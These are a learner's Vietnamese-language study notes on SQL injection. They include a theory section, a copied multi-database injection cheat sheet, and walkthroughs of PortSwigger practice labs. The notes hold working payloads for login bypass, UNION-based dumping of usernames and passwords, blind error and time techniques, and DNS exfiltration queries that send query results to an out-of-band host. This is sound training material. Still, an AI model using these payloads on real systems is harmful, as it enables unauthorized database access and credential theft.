Đi qua về lý thuyết 

SQL injection là một kỹ thuật tấn công phổ biến trong lập trình web, nơi kẻ tấn công chèn các câu lệnh SQL bất hợp pháp vào các trường nhập liệu của ứng dụng web để thực hiện các thao tác không được phép trên cơ sở dữ liệu.

Ví dụ, giả sử bạn có một biểu mẫu đăng nhập trên trang web của mình, và bạn sử dụng một truy vấn SQL để kiểm tra thông tin đăng nhập như sau:
    SELECT * FROM users WHERE username = '$_POST[username]' AND password = '$_POST[password]'

Nếu kẻ tấn công chèn vào ô nhập liệu của username một chuỗi như sau:
    ' OR '1'='1

Thì truy vấn SQL sẽ trở thành:
    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '$_POST[password]'

Trong trường hợp này, điều kiện '1'='1' luôn đúng, nên điều này sẽ khiến truy vấn trả về tất cả các bản ghi trong bảng "users", cho phép kẻ tấn công đăng nhập mà không cần biết tài khoản hoặc mật khẩu hợp lệ.

Đây chỉ là một ví dụ cơ bản, nhưng SQL injection có thể được sử dụng để thực hiện nhiều loại tấn công khác nhau như lấy dữ liệu nhạy cảm, xóa hoặc sửa đổi dữ liệu, thậm chí kiểm soát hoàn toàn hệ thống cơ sở dữ liệu. Điều quan trọng là luôn kiểm tra và xử lý đầu vào từ người dùng một cách an toàn để tránh các cuộc tấn công như vậy.

=======================================================================================================================================================================================================

 _______ _____  _____ _____ _  __
|__   __|  __ \|_   _/ ____| |/ /
   | |  | |__) | | || |    | ' / 
   | |  |  _  /  | || |    |  <  
   | |  | | \ \ _| || |____| . \ 
   |_|  |_|  \_\_____\_____|_|\_\

TRICK : (https://portswigger.net/web-security/sql-injection/cheat-sheet)

String concatenation
    You can concatenate together multiple strings to make a single string.
        Oracle	        'foo'||'bar'
        Microsoft    	'foo'+'bar'
        PostgreSQL	    'foo'||'bar'
        MySQL	        'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar')

Substring
    You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
        Oracle	    SUBSTR('foobar', 4, 2)
        Microsoft	SUBSTRING('foobar', 4, 2)
        PostgreSQL	SUBSTRING('foobar', 4, 2)
        MySQL	    SUBSTRING('foobar', 4, 2)

Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.
    Oracle	    --comment ( cay vl rõ ràng chatgpt hỏi thì oracle không dùng comment -- như này, mà theo logic của bài 5 thì cũng đúng)
    Microsoft	--comment
                /*comment*/
    PostgreSQL	--comment
                /*comment*/
    	        #comment
    MySQL       -- comment [Note the space after the double dash]
                /*comment*/

Database version
    You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
        Oracle	    SELECT banner FROM v$version
                    SELECT version FROM v$instance
        Microsoft	SELECT @@version
        PostgreSQL	SELECT version()
        MySQL	    SELECT @@version

Database contents
    You can list the tables that exist in the database, and the columns that those tables contain.
        Oracle	    SELECT * FROM all_tables
                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
        Microsoft	SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
        PostgreSQL	SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
        MySQL	    SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

Conditional errors
    You can test a single boolean condition and trigger a database error if the condition is true.
        Oracle	    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
        Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
        PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
        MySQL	    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

Extracting data via visible error messages
    You can potentially elicit error messages that leak sensitive data returned by your malicious query.
        Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')
                    > Conversion failed when converting the varchar value 'secret' to data type int.
        PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
                    > invalid input syntax for integer: "secret"
        MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
                    > XPATH syntax error: '\secret'

Batched (or stacked) queries
    You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
        Oracle	    Does not support batched queries.
        Microsoft	QUERY-1-HERE; QUERY-2-HERE
                    QUERY-1-HERE QUERY-2-HERE
        PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
        MySQL	    QUERY-1-HERE; QUERY-2-HERE

Time delays
    You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
        Oracle	    dbms_pipe.receive_message(('a'),10)
        Microsoft	WAITFOR DELAY '0:0:10'
        PostgreSQL	SELECT pg_sleep(10)
        MySQL	    SELECT SLEEP(10)

Conditional time delays
    You can test a single boolean condition and trigger a time delay if the condition is true.
        Oracle	    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
        Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
        PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
        MySQL    	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

DNS lookup
    You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.	
    (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
    Oracle
        SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
        The following technique works on fully patched Oracle installations, but requires elevated privileges:
            SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
    Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
    PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
    MySQL	
                The following techniques work on Windows only:
                LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
                SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

DNS lookup with data exfiltration
You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
    Oracle    	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
    PostgreSQL	create OR replace function f() returns void as $$
                declare c text;
                declare p text;
                begin
                SELECT into p (SELECT YOUR-QUERY-HERE);
                c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
                execute c;
                END;
                $$ language plpgsql security definer;
                SELECT f();
    MySQL	
        The following technique works on Windows only:
            SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

=======================================================================================================================================================================================================


 .d8b.  d888888b d888888b  .d8b.   .o88b. db   dD         db    db d88888b  .o88b. d888888b  .d88b.  d8888b. 
d8' `8b `~~88~~' `~~88~~' d8' `8b d8P  Y8 88 ,8P'         88    88 88'     d8P  Y8 `~~88~~' .8P  Y8. 88  `8D 
88ooo88    88       88    88ooo88 8P      88,8P           Y8    8P 88ooooo 8P         88    88    88 88oobY' 
88~~~88    88       88    88~~~88 8b      88`8b           `8b  d8' 88~~~~~ 8b         88    88    88 88`8b   
88   88    88       88    88   88 Y8b  d8 88 `88.          `8bd8'  88.     Y8b  d8    88    `8b  d8' 88 `88. 
YP   YP    YP       YP    YP   YP  `Y88P' YP   YD C88888D    YP    Y88888P  `Y88P'    YP     `Y88P'  88   YD 

Xác định kiểu database -> Liệt kê các table -> liệt kê cột trong table cụ thể -> get dữ liệu theo tên cột 


=======================================================================================================================================================================================================

                                          ___   ___                          
    / /        // | |     //   ) ) /__  ___/ / /    /|    //| |     //   / / 
   / /        //__| |    //___/ /    / /    / /    //|   // | |    //____    
  / /        / ___  |   / __  (     / /    / /    // |  //  | |   / ____     
 / /        //    | |  //    ) )   / /    / /    //  | //   | |  //          
/ /____/ / //     | | //____/ /   / /  __/ /___ //   |//    | | //____/ /  



Bài 1 : https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

    Thêm +OR+1=1-- vào category 
    https://0a6b008f044b770281c84dc7007c003f.web-security-academy.net/filter?category=Food+%26+Drink%27+OR+1=1--

    => Lỗi SQL injection ở phần WHERE trong câu truy vấn 

Bài 2 : https://portswigger.net/web-security/sql-injection/lab-login-bypass
    username: 'or 1=1--
    password: 'or 1=1--

Bài 3 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
    Bài này sử dụng UNION
    Vì sao lại biết được sử dụng UNION -> chắc có lẽ đáp án là thử thử các trường hợp 
        UNION là câu lệnh nối tiếp câu truy vấn SQL trong MySQL,PostgreSQL, SQLite, Microsoft SQL Server, Oracle Database ( chatgpt bảo thế ) 
    UNION là keyword nối 2 câu truy vấn với nhau. Nhưng SELECT có thể bừa được nhưng FROM thì biết bảng nào mà điền để cho truy vấn hợp lệ
        => dùng Table mặc định DUAL 
    Thêm payload 'UNION+SELECT+NULL,NULL+FROM+DUAL--
        Số lượng giá trị "NULL" tuỳ thuộc vào số cột của table hiện tại đang truy vấn sau chữ UNION 

Bài 4 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
    Bài này sử dụng UNION
    Giống bài trên nhưng vì là mysql nên lệnh comment sẽ khác nhé ( bài 3 là oracle ) 
        -- sẽ được chuyển thành #
        Mà nó cũng k cần FROM gì luôn 
            '+UNION+SELECT+'abc','def'#
        Lưu ý ở đây là gì ? 
            KHÔNG ĐƯỢC URL ENCODE DẤU PHẨY ,
            HÃY ENCODE TẤT CẢ NHƯNG TRỪ DẤU PHẨY ( hoặc lab nó thiết kế sai ) 

    => '+UNION+SELECT+@@version,+NULL#
        @@version là của Mysql nhé 

Bài 5 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
    Bài này gợi ý là UNION attack
        -> Ta đã học đc 2 bài UNION khác nhau -> thử payload 
            '+UNION+SELECT+'abc','def'--
                -> Chưa kết luận được đây là gì nhưng không phải là oracle
            'UNION+SELECT+version(),+NULL--
                -> payload này sử dụng được -> là PortgreSQL
            'UNION+SELECT+table_name,NULL+FROM information_schema.tables--
                Cái cần nhớ ở đây là table_name và information_schema.tables-- của loại database PortgreSQL
                => Hiện thị danh sách table_name
            'UNION+SELECT+column_name,NULL+FROM information_schema.columns WHERE table_name = 'users_hcwsjv'--
                Cái cần nhớ ở đây là column_name , information_schema.columns
                Đã trả về số lượng cột, hàng của database 
            'UNION+SELECT+username_zlowfo,password_oaiwqn+FROM+users_hcwsjv--
                2 Giá trị username_zlowfo và password_oaiwqn là tên cột của bảng 

Bài 6 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
    'UNION+SELECT+NULL,NULL+FROM+DUAL--
        Đừng để phải giải thích nhiều đang nóng tính 
        -> Loại trừ PortgreSQL 
    'UNION+SELECT+table_name,NULL+FROM+all_tables--
        Không nghi ngờ gì nữa Oracle rồi 
        Đáng nhớ ở đây là table_name và all_tables
    'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
        Cần nhờ all_tab_columns
        Hiển thị ra các column của table 
    'UNION+SELECT+USERNAME_HSDRSP,PASSWORD_YMQYCE+FROM+USERS_EIFSPV--
    
Bài 7 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
    'UNION+SELECT+NULL,NULL,NULL--
        Bài này basic quá, tìm số lượng cột thì tăng giá trị null lên thôi là ra mà 

Bài 8 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
    %27UNION+SELECT+NULL,%27nkJ8PG%27,NULL--
        SQL injection bắt in ra giá trị nkJ8PG nên quá là đơn giản 

Bài 9 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
    Giống lab 5 

Bài 10 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
    '+UNION+SELECT+NULL,'abc'--
        Xác định có 2 cột trong bảng 
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
        Đang làm đến payload này . lạ quá cần phân tích thêm 
